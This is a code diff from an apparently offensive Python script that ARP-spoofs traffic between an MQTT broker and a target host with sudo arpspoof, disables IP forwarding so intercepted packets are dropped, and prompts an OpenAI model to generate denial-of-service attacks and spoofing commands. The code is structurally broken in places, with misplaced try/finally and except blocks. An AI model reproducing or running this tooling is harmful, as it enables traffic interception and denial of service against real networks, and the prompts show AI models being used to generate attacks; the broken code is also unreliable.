@@ -56,23 +56,21 @@ def denial_of_service():
     try:
         print("Performing Denial of Serivce Attack....")
         #TODO: Have AI generate this command
-        openai.api_key
         prompt = "Generate denial of service attack for " + targetIP
     # Function to send a message to ChatGPT
-        def send_message_to_gpt(prompt):
-            response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
 
+        openai.api_key = API_KEY
+        response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
     finally:
-        return response['choices'][0]['message']['content']
+        return response
 
-    
 os.system("sudo sysctl -w net.ipv4.ip_forward=0")
         #Reroutes packets from the MQTT server through this computer.
 nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 while True:
     #TODO: Have AI generate this command.
-    
-    prompt = "generate a code that stores all data from these pactets then drops them "
+    openai.api_key = API_KEY
+    prompt = "generate a terminal command that arpspoofs the packets from "+ brokerIP + " to " +targetIP
     response = openai.ChatCompletion.create(model=llm_model,messages=[{"role": "user", "content": prompt}])
             #Reroutes packets from the MQTT server through this computer.
     nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", targetIP, brokerIP], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -86,7 +84,7 @@ while True:
 #TODO: Create a command that sends relevant attack information to the XR AI agent (Trenton).
 
 try:
-    while True: 
+    while True:
         lang_classification()
         #Classifies the responcs in an array
         response = lang_classification()
@@ -121,7 +119,3 @@ finally:
 
 except KeyboardInterrupt:
     print("Stopping Attack....")
-
-except KeyboardInterrupt:
-    print("Stopping Attack....")
-
